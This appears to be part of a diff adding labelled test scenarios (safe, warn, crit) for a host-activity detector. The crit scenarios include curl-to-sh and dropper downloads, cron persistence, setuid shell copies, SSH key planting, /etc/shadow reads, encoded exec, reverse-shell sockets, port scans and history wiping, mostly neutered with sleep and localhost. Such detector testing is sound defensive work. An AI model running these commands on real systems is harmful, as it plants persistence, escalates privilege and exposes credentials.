+params = { n = 120 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do curl -s -o /dev/null http://127.0.0.1/; sleep 0.05; i=$((i+1)); done", timeout = 40 }]
+
+[[scenarios]]
+id = "cron_persist.b"
+family = "cron_persist"
+label = "crit"
+expected = 3
+at = 2423
+duration = 10
+params = { bin = "/var/lib/.mon", name = "e2scrub", secs = 4 }
+steps = [{ cmd = "cp /usr/bin/sleep {bin} && printf '* * * * * root {bin}\\n' > /etc/cron.d/{name} && {bin} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "test_runner.a"
+family = "test_runner"
+label = "safe"
+expected = 3
+at = 2437
+duration = 8
+params = { n = 3, secs = 2 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do python3 -c 'import time; time.sleep({secs})' & i=$((i+1)); done; wait", timeout = 40 }]
+
+[[scenarios]]
+id = "remote_script.c"
+family = "remote_script"
+label = "crit"
+expected = 3
+at = 2449
+duration = 9
+params = { secs = 1 }
+steps = [{ cmd = "curl -s http://127.0.0.1/payload.sh | sh -s; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "health_probe.a"
+family = "health_probe"
+label = "safe"
+expected = 3
+at = 2462
+duration = 9
+params = { n = 3, path = "payload.sh" }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do curl -sf -o /dev/null http://127.0.0.1/{path}; sleep 1; i=$((i+1)); done", timeout = 40 }]
+
+[[scenarios]]
+id = "python_tool.a"
+family = "python_tool"
+label = "safe"
+expected = 3
+at = 2475
+duration = 8
+params = { code = "print(sum(range(1000)))", secs = 2 }
+steps = [{ cmd = "python3 -c \"{code}\"; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "big_alloc.c"
+family = "big_alloc"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 3
+at = 2487
+duration = 11
+params = { mb = 380, secs = 5 }
+steps = [{ cmd = "python3 -c \"import time; b = bytearray({mb} * 1024 * 1024); time.sleep({secs})\"", timeout = 40 }]
+
+[[scenarios]]
+id = "ssh_key_drop.c"
+family = "ssh_key_drop"
+label = "crit"
+expected = 3
+at = 2502
+duration = 9
+params = { key = "H7aab", secs = 3 }
+steps = [{ cmd = "mkdir -p /root/.ssh && printf 'ssh-ed25519 AAAA{key} root@x\\n' >> /root/.ssh/authorized_keys; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "file_sync.b"
+family = "file_sync"
+label = "safe"
+expected = 3
+at = 2515
+duration = 9
+params = { dst = "/root/backup-sync", secs = 3 }
+steps = [{ cmd = "mkdir -p {dst} && cp -r /etc/default {dst}/ 2>/dev/null; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "compress_big.c"
+family = "compress_big"
+label = "warn"
+expected = 3
+at = 2528
+duration = 9
+params = { out = "/root/py.gz", secs = 2 }
+steps = [{ cmd = "gzip -c /usr/bin/python3* > {out}; sleep {secs}", timeout = 40 }]
+
+# Stage-5 variants and families (generated by scripts/gen_scenarios2.py)
+
+[[scenarios]]
+id = "one_off_script.d"
+family = "one_off_script"
+label = "warn"
+container = "target"
+expected = 3
+at = 2544
+duration = 11
+params = { secs = 2 }
+steps = [{ cmd = "printf 'echo run; sleep {secs}\\n' > /tmp/once.sh && sh /tmp/once.sh", timeout = 30 }]
+
+[[scenarios]]
+id = "setuid_copy.g"
+family = "setuid_copy"
+label = "crit"
+container = "target"
+expected = 3
+at = 2559
+duration = 10
+params = { path = "/tmp/.bundled", secs = 5 }
+steps = [{ cmd = "cp /bin/sh {path} && chmod u+s {path} && {path} -c 'sleep {secs}'", timeout = 40 }]
+
+[[scenarios]]
+id = "sort_count.a"
+family = "sort_count"
+label = "safe"
+container = "target"
+expected = 3
+at = 2573
+duration = 9
+params = { out = "/tmp/count.txt", secs = 2 }
+steps = [{ cmd = "printf 'b\\na\\nb\\n' | sort | uniq -c > {out}; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "curl_flood.d"
+family = "curl_flood"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 2586
+duration = 13
+params = { n = 97 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do curl -s -o /dev/null http://127.0.0.1/; sleep 0.05; i=$((i+1)); done", timeout = 40 }]
+
+[[scenarios]]
+id = "file_sync.e"
+family = "file_sync"
+label = "safe"
+container = "target"
+expected = 3
+at = 2603
+duration = 10
+params = { dst = "/var/cache/pooler", secs = 3 }
+steps = [{ cmd = "mkdir -p {dst} && cp -r /etc/default {dst}/ 2>/dev/null; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "tool_upgrade.f"
+family = "tool_upgrade"
+label = "warn"
+container = "target"
+expected = 3
+at = 2617
+duration = 10
+params = { bin = "/srv/bin/bundled", secs = 5 }
+steps = [{ cmd = "mkdir -p $(dirname {bin}) && cp /usr/bin/sleep {bin}.new && mv {bin}.new {bin} && {bin} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "pkg_install.g"
+family = "pkg_install"
+label = "safe"
+container = "target"
+expected = 6
+at = 2631
+duration = 15
+params = { n = 6 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do cp /bin/true /tmp/unp.$i && /tmp/unp.$i; i=$((i+1)); done", timeout = 20 }]
+
+[[scenarios]]
+id = "setuid_copy.e"
+family = "setuid_copy"
+label = "crit"
+container = "target"
+expected = 3
+at = 2650
+duration = 10
+params = { path = "/root/tools/.fetchd", secs = 4 }
+steps = [{ cmd = "cp /bin/sh {path} && chmod u+s {path} && {path} -c 'sleep {secs}'", timeout = 40 }]
+
+[[scenarios]]
+id = "json_check.d"
+family = "json_check"
+label = "safe"
+container = "target"
+expected = 3
+at = 2664
+duration = 9
+params = { payload = "[true, null]", secs = 3 }
+steps = [{ cmd = "python3 -c \"import json; print(json.loads('{payload}'))\"; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "retry_storm.g"
+family = "retry_storm"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 2677
+duration = 13
+params = { n = 20, gap = 0.37 }
+steps = [{ cmd = "python3 -c \"import subprocess; [subprocess.run(['sleep', '{gap}']) for _ in range({n})]\"", timeout = 40 }]
+
+[[scenarios]]
+id = "hidden_cron.c"
+family = "hidden_cron"
+label = "crit"
+container = "target"
+expected = 4
+at = 2694
+duration = 13
+params = { path = "/usr/local/sbin/.cachew", secs = 5 }
+steps = [{ cmd = "mkdir -p {path} && printf '* * * * * {path}/.sysd\\n' > {path}/entry && cp /usr/bin/sleep {path}/.sysd && cd {path} && ./.sysd {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "pipe_spawn.f"
+family = "pipe_spawn"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 2711
+duration = 13
+params = { n = 172, secs = 7 }
+steps = [{ cmd = "python3 -c \"import subprocess; ps = [subprocess.Popen(['sleep', '{secs}']) for _ in range({n})]; [p.wait() for p in ps]\"", timeout = 40 }]
+
+[[scenarios]]
+id = "tmpfs_copy.f"
+family = "tmpfs_copy"
+label = "crit"
+container = "target"
+expected = 4
+at = 2728
+duration = 13
+params = { path = "/var/opt/pkg/.warmup", secs = 6 }
+steps = [{ cmd = "cp /usr/bin/sleep {path} && chmod +x {path} && {path} {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "local_server.g"
+family = "local_server"
+label = "warn"
+container = "target"
+expected = 3
+at = 2745
+duration = 11
+params = { port = 400, secs = 2 }
+steps = [{ cmd = "python3 -m http.server {port} --bind 127.0.0.1 >/dev/null 2>&1 & sleep {secs}; kill $!", timeout = 40 }]
+
+[[scenarios]]
+id = "unexpected_parent.f"
+family = "unexpected_parent"
+label = "crit"
+container = "target"
+expected = 5
+at = 2760
+duration = 11
+params = { path = "/usr/local/bin/linkd" }
+steps = [{ cmd = "cp /usr/bin/python3 {path} && {path} -c \"import subprocess; subprocess.run(['sh', '-c', 'sleep 3'])\"", timeout = 30 }]
+
+[[scenarios]]
+id = "disk_audit.d"
+family = "disk_audit"
+label = "warn"
+container = "target"
+expected = 3
+at = 2775
+duration = 10
+params = { a = "/etc", b = "/opt", secs = 3 }
+steps = [{ cmd = "du -sh {a} {b} 2>/dev/null; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "compress_big.f"
+family = "compress_big"
+label = "warn"
+container = "target"
+expected = 3
+at = 2789
+duration = 10
+params = { out = "/var/tmp/boxd", secs = 1 }
+steps = [{ cmd = "gzip -c /usr/bin/python3* > {out}; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "home_script.g"
+family = "home_script"
+label = "warn"
+container = "target"
+expected = 4
+at = 2803
+duration = 13
+params = { path = "/opt/vendor/bin/bundled", script = "deploy.sh", secs = 7 }
+steps = [{ cmd = "mkdir -p {path} && printf '#!/bin/sh\\nsleep {secs}\\n' > {path}/{script} && cd /root && sh .local/share/bin/{script}", timeout = 30 }]
+
+[[scenarios]]
+id = "source_checkout.d"
+family = "source_checkout"
+label = "safe"
+container = "target"
+expected = 3
+at = 2820
+duration = 10
+params = { dir = "/opt/tools/panel", secs = 1 }
+steps = [{ cmd = "mkdir -p {dir}/src && cd {dir}/src && printf 'int main(){{}}\\n' > main.c && cp main.c main.bak; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "curl_flood.f"
+family = "curl_flood"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 2834
+duration = 13
+params = { n = 64 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do curl -s -o /dev/null http://127.0.0.1/; sleep 0.05; i=$((i+1)); done", timeout = 40 }]
+
+[[scenarios]]
+id = "cron_persist.d"
+family = "cron_persist"
+label = "crit"
+container = "target"
+expected = 3
+at = 2851
+duration = 11
+params = { bin = "/usr/lib/.bundled", name = "anacron-x", secs = 4 }
+steps = [{ cmd = "cp /usr/bin/sleep {bin} && printf '* * * * * root {bin}\\n' > /etc/cron.d/{name} && {bin} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "test_runner.g"
+family = "test_runner"
+label = "safe"
+container = "target"
+expected = 3
+at = 2866
+duration = 9
+params = { n = 3, secs = 1.72 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do python3 -c 'import time; time.sleep({secs})' & i=$((i+1)); done; wait", timeout = 40 }]
+
+[[scenarios]]
+id = "disk_filler.c"
+family = "disk_filler"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 2
+at = 2879
+duration = 15
+params = { n = 6 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do dd if=/dev/zero of=/scratch/blob.$i bs=1M count=6 2>/dev/null; sleep 1.2; i=$((i+1)); done; rm -f /scratch/blob.*", timeout = 30 }]
+
+[[scenarios]]
+id = "backup_job.f"
+family = "backup_job"
+label = "warn"
+container = "target"
+expected = 3
+at = 2898
+duration = 13
+params = { dir = "/srv/spoold", secs = 4 }
+steps = [{ cmd = "mkdir -p {dir} && tar -cf {dir}/etc.tar /etc/hostname 2>/dev/null; sh -c 'sleep {secs}'", timeout = 30 }]
+
+[[scenarios]]
+id = "hotfix_script.c"
+family = "hotfix_script"
+label = "warn"
+container = "target"
+expected = 3
+at = 2915
+duration = 11
+params = { secs = 6 }
+steps = [{ cmd = "printf 'import time\\ntime.sleep({secs})\\n' > /root/hotfix.py && python3 /root/hotfix.py", timeout = 30 }]
+
+[[scenarios]]
+id = "shadow_copy.d"
+family = "shadow_copy"
+label = "crit"
+container = "target"
+expected = 4
+at = 2930
+duration = 11
+params = { secs = 4 }
+steps = [{ cmd = "cp /etc/passwd /tmp/.p && cp /usr/bin/sleep /usr/local/lib/.s && /usr/local/lib/.s {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "tar_pack.d"
+family = "tar_pack"
+label = "safe"
+container = "target"
+expected = 3
+at = 2945
+duration = 9
+params = { out = "/srv/pack.tgz", secs = 3 }
+steps = [{ cmd = "tar czf {out} /etc/hostname /etc/os-release 2>/dev/null; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "ssh_session.c"
+family = "ssh_session"
+label = "safe"
+container = "target"
+expected = 5
+at = 2958
+duration = 13
+params = { n = 2, secs = 4 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do setsid sh -c \"sleep {secs}\" & i=$((i+1)); done; wait", timeout = 30 }]
+
+[[scenarios]]
+id = "thread_burst.c"
+family = "thread_burst"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 2
+at = 2975
+duration = 13
+params = { n = 101 }
+steps = [{ cmd = "python3 -c \"import threading, time; [threading.Thread(target=time.sleep, args=(5,)).start() for _ in range({n})]; time.sleep(6)\"", timeout = 30 }]
+
+[[scenarios]]
+id = "dropper_stage.c"
+family = "dropper_stage"
+label = "crit"
+container = "target"
+expected = 4
+at = 2992
+duration = 13
+params = { secs = 3 }
+steps = [{ cmd = "curl -sf -o /var/lib/.d http://127.0.0.1/payload.sh && chmod +x /var/lib/.d && /var/lib/.d", timeout = 30 }]
+
+[[scenarios]]
+id = "odd_timestamp.b"
+family = "odd_timestamp"
+label = "warn"
+container = "target"
+expected = 3
+at = 3009
+duration = 9
+params = { n = 2, path = "/var/tmp/old.txt", secs = 3 }
+steps = [{ cmd = "touch -d '2020-01-0{n} 03:00' {path}; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "cron_timer.c"
+family = "cron_timer"
+label = "safe"
+container = "target"
+expected = 9
+at = 3022
+duration = 17
+params = { n = 3, job = 5, cadence = 5 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do sleep {job} & i=$((i+1)); sleep {cadence}; done; wait", timeout = 30 }]
+
+[[scenarios]]
+id = "long_argument.d"
+family = "long_argument"
+label = "warn"
+container = "target"
+expected = 3
+at = 3043
+duration = 9
+params = { secs = 3, text = "one-two-three-four-five-six-seven-eight-nine-ten-eleven-twelve-thirteen-fourteen-fifteen" }
+steps = [{ cmd = "sleep {secs}; echo {text} > /dev/null", timeout = 40 }]
+
+[[scenarios]]
+id = "json_check.b"
+family = "json_check"
+label = "safe"
+container = "target"
+expected = 3
+at = 3056
+duration = 9
+params = { payload = "{\\\"a\\\": 1}", secs = 3 }
+steps = [{ cmd = "python3 -c \"import json; print(json.loads('{payload}'))\"; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "big_alloc.f"
+family = "big_alloc"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 3069
+duration = 12
+params = { mb = 380, secs = 8 }
+steps = [{ cmd = "python3 -c \"import time; b = bytearray({mb} * 1024 * 1024); time.sleep({secs})\"", timeout = 40 }]
+
+[[scenarios]]
+id = "cron_timer.f"
+family = "cron_timer"
+label = "safe"
+container = "target"
+expected = 9
+at = 3085
+duration = 17
+params = { n = 9, job = 1, cadence = 3 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do sleep {job} & i=$((i+1)); sleep {cadence}; done; wait", timeout = 30 }]
+
+[[scenarios]]
+id = "curl_flood.g"
+family = "curl_flood"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 3106
+duration = 13
+params = { n = 78 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do curl -s -o /dev/null http://127.0.0.1/; sleep 0.05; i=$((i+1)); done", timeout = 40 }]
+
+[[scenarios]]
+id = "env_wrapper.d"
+family = "env_wrapper"
+label = "warn"
+container = "target"
+expected = 3
+at = 3123
+duration = 9
+params = { wrap = "env LANG=C TZ=UTC", secs = 3 }
+steps = [{ cmd = "{wrap} sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "retry_storm.e"
+family = "retry_storm"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 3136
+duration = 13
+params = { n = 43, gap = 0.13 }
+steps = [{ cmd = "python3 -c \"import subprocess; [subprocess.run(['sleep', '{gap}']) for _ in range({n})]\"", timeout = 40 }]
+
+[[scenarios]]
+id = "gzip_loop.e"
+family = "gzip_loop"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 3153
+duration = 13
+params = { secs = 8 }
+steps = [{ cmd = "timeout {secs} sh -c 'yes | gzip -c > /dev/null'; true", timeout = 40 }]
+
+[[scenarios]]
+id = "fd_leak.e"
+family = "fd_leak"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 2
+at = 3170
+duration = 11
+params = { n = 180 }
+steps = [{ cmd = "python3 -c \"import time; fs = [open('/dev/null') for _ in range({n})]; time.sleep(4)\"", timeout = 30 }]
+
+[[scenarios]]
+id = "inline_encoded.d"
+family = "inline_encoded"
+label = "crit"
+container = "target"
+expected = 2
+at = 3185
+duration = 9
+params = { payload = "eNrLzC3ILypRKMnMTbUGEXrFOampBRpGmgB+wwkf" }
+steps = [{ cmd = "python3 -c \"import zlib, base64; exec(zlib.decompress(base64.b64decode('{payload}')))\"", timeout = 20 }]
+
+[[scenarios]]
+id = "fd_leak.d"
+family = "fd_leak"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 2
+at = 3198
+duration = 11
+params = { n = 180 }
+steps = [{ cmd = "python3 -c \"import time; fs = [open('/dev/null') for _ in range({n})]; time.sleep(4)\"", timeout = 30 }]
+
+[[scenarios]]
+id = "write_loop.d"
+family = "write_loop"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 3213
+duration = 13
+params = { name = "blob1", mb = 42, secs = 8 }
+steps = [{ cmd = "dd if=/dev/zero of=/scratch/{name} bs=1M count={mb} 2>/dev/null; sleep {secs}; rm -f /scratch/{name}", timeout = 40 }]
+
+[[scenarios]]
+id = "cred_read.g"
+family = "cred_read"
+label = "crit"
+container = "target"
+expected = 3
+at = 3230
+duration = 9
+params = { out = "/dev/fetchd", secs = 1 }
+steps = [{ cmd = "cat /etc/passwd /etc/shadow > {out} 2>/dev/null; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "respawn_loop.c"
+family = "respawn_loop"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 51
+at = 3243
+duration = 17
+params = { n = 24 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do sh -c 'sleep 0.4'; i=$((i+1)); done", timeout = 32 }]
+
+[[scenarios]]
+id = "world_writable_exec.b"
+family = "world_writable_exec"
+label = "crit"
+container = "target"
+expected = 3
+at = 3264
+duration = 10
+params = { dir = "/var/tmp/.cache2", name = ".svc", secs = 4 }
+steps = [{ cmd = "mkdir -p {dir} && chmod 777 {dir} && cp /usr/bin/sleep {dir}/{name} && {dir}/{name} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "pipe_spawn.d"
+family = "pipe_spawn"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 3278
+duration = 13
+params = { n = 69, secs = 4 }
+steps = [{ cmd = "python3 -c \"import subprocess; ps = [subprocess.Popen(['sleep', '{secs}']) for _ in range({n})]; [p.wait() for p in ps]\"", timeout = 40 }]
+
+[[scenarios]]
+id = "odd_timestamp.d"
+family = "odd_timestamp"
+label = "warn"
+container = "target"
+expected = 3
+at = 3295
+duration = 9
+params = { n = 4, path = "/srv/stamp", secs = 3 }
+steps = [{ cmd = "touch -d '2020-01-0{n} 03:00' {path}; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "port_scan.d"
+family = "port_scan"
+label = "crit"
+container = "target"
+expected = 2
+at = 3308
+duration = 13
+params = { secs = 1 }
+steps = [{ cmd = "bash -c 'for p in 21 22 23 25 80 110 443 3306 5432 8080; do (echo > /dev/tcp/127.0.0.1/$p) 2>/dev/null; done; sleep {secs}'", timeout = 30 }]
+
+[[scenarios]]
+id = "disk_filler.d"
+family = "disk_filler"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 2
+at = 3325
+duration = 15
+params = { n = 10 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do dd if=/dev/zero of=/scratch/blob.$i bs=1M count=6 2>/dev/null; sleep 1.2; i=$((i+1)); done; rm -f /scratch/blob.*", timeout = 30 }]
+
+[[scenarios]]
+id = "bind_shell.e"
+family = "bind_shell"
+label = "crit"
+container = "target"
+expected = 3
+at = 3344
+duration = 10
+params = { port = 400, secs = 4 }
+steps = [{ cmd = "python3 -c \"import socket, time; s = socket.socket(); s.bind(('127.0.0.1', {port})); s.listen(1); time.sleep({secs})\"", timeout = 40 }]
+
+[[scenarios]]
+id = "dropper_stage.d"
+family = "dropper_stage"
+label = "crit"
+container = "target"
+expected = 4
+at = 3358
+duration = 13
+params = { secs = 5 }
+steps = [{ cmd = "curl -sf -o /var/tmp/.upd http://127.0.0.1/payload.sh && chmod 700 /var/tmp/.upd && sh /var/tmp/.upd", timeout = 30 }]
+
+[[scenarios]]
+id = "thread_burst.f"
+family = "thread_burst"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 2
+at = 3375
+duration = 13
+params = { n = 102 }
+steps = [{ cmd = "python3 -c \"import threading, time; [threading.Thread(target=time.sleep, args=(4,)).start() for _ in range({n})]; time.sleep(5)\"", timeout = 30 }]
+
+[[scenarios]]
+id = "new_tool.g"
+family = "new_tool"
+label = "warn"
+container = "target"
+expected = 3
+at = 3392
+duration = 13
+params = { dir = "/usr/local/metad", name = "forge", secs = 7 }
+steps = [{ cmd = "cp /usr/bin/sleep {dir}/{name} && cd {dir} && ./{name} {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "cron_timer.e"
+family = "cron_timer"
+label = "safe"
+container = "target"
+expected = 9
+at = 3409
+duration = 17
+params = { n = 10, job = 2, cadence = 4 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do sleep {job} & i=$((i+1)); sleep {cadence}; done; wait", timeout = 30 }]
+
+[[scenarios]]
+id = "tight_python_spin.d"
+family = "tight_python_spin"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 3430
+duration = 12
+params = { secs = 7 }
+steps = [{ cmd = "python3 -c \"import time; t = time.time(); [None for _ in iter(lambda: time.time() - t < {secs}, False)]\"", timeout = 40 }]
+
+[[scenarios]]
+id = "report_job.g"
+family = "report_job"
+label = "safe"
+container = "target"
+expected = 3
+at = 3446
+duration = 10
+params = { out = "/var/tmp/peerd", secs = 4 }
+steps = [{ cmd = "date > {out}; uname -a >> {out}; df -h >> {out}; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "miner_like.c"
+family = "miner_like"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 3460
+duration = 15
+params = { secs = 7 }
+steps = [{ cmd = "python3 -c 'import time; t = time.time(); exec(\"while time.time() - t < {secs}: pass\")' & python3 -c 'import time; t = time.time(); exec(\"while time.time() - t < {secs}: pass\")' & python3 -c 'import time; t = time.time(); exec(\"while time.time() - t < {secs}: pass\")' & wait", timeout = 30 }]
+
+[[scenarios]]
+id = "retry_storm.d"
+family = "retry_storm"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 3479
+duration = 13
+params = { n = 38, gap = 0.27 }
+steps = [{ cmd = "python3 -c \"import subprocess; [subprocess.run(['sleep', '{gap}']) for _ in range({n})]\"", timeout = 40 }]
+
+[[scenarios]]
+id = "agent_swarm.f"
+family = "agent_swarm"
+label = "safe"
+container = "target"
+expected = 21
+at = 3496
+duration = 9
+params = { n = 18, work = 0.1, tail = 5 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do sleep {work} & i=$((i+1)); done; sleep {tail}; wait", timeout = 20 }]
+
+[[scenarios]]
+id = "miner_like.f"
+family = "miner_like"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 3
+at = 3509
+duration = 15
+params = { secs = 7 }
+steps = [{ cmd = "python3 -c 'import time; t = time.time(); exec(\"while time.time() - t < {secs}: pass\")' & python3 -c 'import time; t = time.time(); exec(\"while time.time() - t < {secs}: pass\")' & python3 -c 'import time; t = time.time(); exec(\"while time.time() - t < {secs}: pass\")' & wait", timeout = 30 }]
+
+[[scenarios]]
+id = "health_probe.e"
+family = "health_probe"
+label = "safe"
+container = "target"
+expected = 3
+at = 3528
+duration = 10
+params = { n = 4, path = "payload.sh" }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do curl -sf -o /dev/null http://127.0.0.1/{path}; sleep 1; i=$((i+1)); done", timeout = 40 }]
+
+[[scenarios]]
+id = "vendor_binary.e"
+family = "vendor_binary"
+label = "warn"
+container = "target"
+expected = 3
+at = 3542
+duration = 11
+params = { dir = "/srv/app/boxd", secs = 8 }
+steps = [{ cmd = "mkdir -p {dir} && cp /usr/bin/sleep {dir}/cts-sync && {dir}/cts-sync {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "disk_audit.g"
+family = "disk_audit"
+label = "warn"
+container = "target"
+expected = 3
+at = 3557
+duration = 10
+params = { a = "/etc", b = "/opt", secs = 3 }
+steps = [{ cmd = "du -sh {a} {b} 2>/dev/null; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "mem_grower.g"
+family = "mem_grower"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 2
+at = 3571
+duration = 16
+params = { n = 26, gap = 0.37 }
+steps = [{ cmd = "python3 -c \"import time; b = bytearray(); [b.extend(bytes(8 * 1024 * 1024)) or time.sleep({gap}) for _ in range({n})]; time.sleep(1)\"", timeout = 35 }]
+
+[[scenarios]]
+id = "reverse_shell.d"
+family = "reverse_shell"
+label = "crit"
+container = "target"
+expected = 3
+at = 3591
+duration = 11
+params = { secs = 2 }
+steps = [{ cmd = "python3 -c \"import socket, subprocess, os; s = socket.create_connection(('127.0.0.1', 80)); subprocess.run(['sleep', '{secs}'], stdin=s.fileno(), stdout=s.fileno())\"", timeout = 30 }]
+
+[[scenarios]]
+id = "base64_pipe.f"
+family = "base64_pipe"
+label = "crit"
+container = "target"
+expected = 3
+at = 3606
+duration = 10
+params = { b64 = "c2xlZXAgMw==" }
+steps = [{ cmd = "echo '{b64}' | base64 -d | sh; sleep 1", timeout = 40 }]
+
+[[scenarios]]
+id = "reverse_shell.f"
+family = "reverse_shell"
+label = "crit"
+container = "target"
+expected = 3
+at = 3620
+duration = 11
+params = { secs = 6 }
+steps = [{ cmd = "bash -c 'exec 3<>/dev/tcp/127.0.0.1/80; printf \"GET / HTTP/1.0\\r\\n\\r\\n\" >&3; sleep {secs}'", timeout = 30 }]
+
+[[scenarios]]
+id = "respawn_loop.f"
+family = "respawn_loop"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 51
+at = 3635
+duration = 17
+params = { n = 26 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do sh -c 'sleep 0.4'; i=$((i+1)); done", timeout = 32 }]
+
+[[scenarios]]
+id = "remote_script.e"
+family = "remote_script"
+label = "crit"
+container = "target"
+expected = 3
+at = 3656
+duration = 10
+params = { secs = 2 }
+steps = [{ cmd = "curl -s http://127.0.0.1/payload.sh | sh -s; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "deep_path_tool.a"
+family = "deep_path_tool"
+label = "warn"
+container = "target"
+expected = 3
+at = 3670
+duration = 10
+params = { dir = "/opt/a/b/c/d", name = "probe", secs = 3 }
+steps = [{ cmd = "mkdir -p {dir} && cp /usr/bin/sleep {dir}/{name} && {dir}/{name} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "port_scan.c"
+family = "port_scan"
+label = "crit"
+container = "target"
+expected = 2
+at = 3684
+duration = 13
+params = { secs = 1 }
+steps = [{ cmd = "bash -c 'for p in 21 22 23 25 80 110 443 3306 5432 8080; do (echo > /dev/tcp/127.0.0.1/$p) 2>/dev/null; done; sleep {secs}'", timeout = 30 }]
+
+[[scenarios]]
+id = "remote_script.d"
+family = "remote_script"
+label = "crit"
+container = "target"
+expected = 3
+at = 3701
+duration = 10
+params = { secs = 2 }
+steps = [{ cmd = "curl -s http://127.0.0.1/payload.sh | sh -s; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "history_wipe.d"
+family = "history_wipe"
+label = "crit"
+container = "target"
+expected = 3
+at = 3715
+duration = 9
+params = { secs = 3 }
+steps = [{ cmd = "rm -f /root/.bash_history; ln -sf /dev/null /root/.bash_history; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "cpu_spin.f"
+family = "cpu_spin"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+container = "target"
+expected = 2
+at = 3728
+duration = 17
+params = { secs = 8 }
+steps = [{ cmd = "python3 -c \"import time; t = time.time(); exec('while time.time() - t < {secs}: pass')\"", timeout = 30 }]
+
+[[scenarios]]
+id = "ssh_key_drop.d"
+family = "ssh_key_drop"
+label = "crit"
+container = "target"
+expected = 3
+at = 3749
+duration = 10
+params = { key = "C3Nza", secs = 4 }
+steps = [{ cmd = "mkdir -p /root/.ssh && printf 'ssh-ed25519 AAAA{key} root@x\\n' >> /root/.ssh/authorized_keys; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "test_runner.e"
+family = "test_runner"
+label = "safe"
+container = "target"
+expected = 3
+at = 3763
+duration = 9
+params = { n = 3, secs = 2 }
